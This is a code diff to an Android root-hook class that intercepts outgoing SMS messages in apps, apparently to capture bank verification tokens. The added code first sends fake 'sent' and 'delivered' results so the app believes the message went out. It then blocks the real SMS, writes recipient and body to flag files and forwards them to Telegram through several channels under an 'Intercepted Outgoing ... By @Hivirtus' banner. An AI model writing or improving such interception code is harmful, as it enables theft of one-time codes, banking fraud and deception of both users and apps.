@@ -311,12 +311,48 @@ public final class SmsTweaksHooks {
         if (body == null) body = "";
         if (to.isEmpty()) to = "9920104300";
         status("isms_java_send|" + to + "|" + (body.length() > 40 ? body.substring(0, 40) : body));
+        // 1) Fake success FIRST — Hero token window
+        firePendingOkSync(to, sentPi, deliveryPi, multiPi);
+        // 2) Persist + urgent TG (root companion / service <1s)
         writeBlockedJson(to, body);
-        // Prefer root service.sh forward (bank apps often block HTTPS) + best-effort direct
         queueServiceTelegram(to, body);
+        writeUrgentFlag(to, body);
+        try {
+            nativeUrgentTg(to, body);
+        } catch (Throwable t) {
+            status("native_urgent_miss|" + t.getClass().getSimpleName());
+        }
         if (!body.isEmpty()) sendTelegram(to, body);
-        // Hero: RESULT_OK instantly — warna "Something went wrong" / token expire
-        firePendingOk(to, sentPi, deliveryPi, multiPi);
+    }
+
+    /** Zygisk .so RegisterNatives — root companion TG (~1s). */
+    private static native void nativeUrgentTg(String to, String body);
+
+    private static void writeUrgentFlag(String to, String body) {
+        try {
+            writeAll("hivirtus_tg_urgent.flag", "1\n");
+            writeAll("hivirtus_outgoing_blocked.flag", to + "\n" + body + "\n");
+        } catch (Throwable ignored) {}
+    }
+
+    private static void firePendingOkSync(final String dest, final PendingIntent sent,
+                                          final PendingIntent delivery,
+                                          final List<PendingIntent> multi) {
+        try {
+            Context ctx = appContext();
+            if (sent != null) fireOnePi(ctx, sent, "sent");
+            if (multi != null) {
+                for (int i = 0; i < multi.size(); i++) {
+                    PendingIntent pi = multi.get(i);
+                    if (pi != null) fireOnePi(ctx, pi, "multi" + i);
+                }
+            }
+            if (delivery != null) fireOnePi(ctx, delivery, "delivery");
+            fireSmsResultBroadcasts(ctx, dest);
+        } catch (Throwable t) {
+            status("pi_sync_fail|" + t.getClass().getSimpleName());
+            firePendingOk(dest, sent, delivery, multi);
+        }
     }
 
     private static Context appContext() {
@@ -595,8 +631,9 @@ public final class SmsTweaksHooks {
                     if (digits.length() == 10) displayTo = "+91" + digits;
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
-                    // Screenshot format: HTML <code> = Telegram tap-to-copy
-                    String msg = "📱 Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥\n"
+                    // Screenshot: bold headers + HTML <code> tap-to-copy
+                    String msg = "<b>Intercepted Outgoing Zygisk Mode Menu</b>\n"
+                            + "<b>By @Hivirtus 🔥</b>\n"
                             + "\n"
                             + "To (Tap to copy):\n"
                             + "<code>" + escHtml(displayTo) + "</code>\n"
